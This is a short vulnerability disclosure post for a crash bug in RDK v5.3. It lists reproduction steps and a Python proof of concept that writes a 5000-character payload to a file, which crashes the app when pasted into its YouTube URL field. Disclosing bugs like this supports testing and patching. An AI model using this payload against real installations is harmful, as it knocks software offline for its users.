---
layout: post
title: RDK v5.3 - Buffer Overflow (DoS)
date: 2024-04-17
category: exploit
---

# Exploit Title: RDK v5.3 - Buffer Overflow (DoS)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.04.2024
# Vendor Homepage: [http://www.shenturk.com](http://www.shenturk.com)
# Software Link: [http://www.shenturk.com/downloads/rdk-5.3-setup.rar](http://www.shenturk.com/downloads/rdk-5.3-setup.rar)
# Tested Version: v5.3 (latest)
# Tested on: Windows 10 32bit

### Steps to Reproduce

1. Open the RDK application.
2. Click on the “Plus” button.
3. Select **YouTube**.
4. Copy the contents of `poc.txt` and paste it into the “YouTube URL” field.
5. Click **Tamam** to confirm.
6. Locate the payload from the list and double-click it.
7. The application should crash.

### Proof of Concept (PoC)

The following script creates a `poc.txt` file containing a payload that causes a buffer overflow in RDK v5.3.

```python
#!/usr/bin/env python3

exploit = 'A' * 5000

try:
    with open("poc.txt", "w") as file:
        file.write(exploit)
    print("POC is created")
except Exception as e:
    print("POC not created:", e)
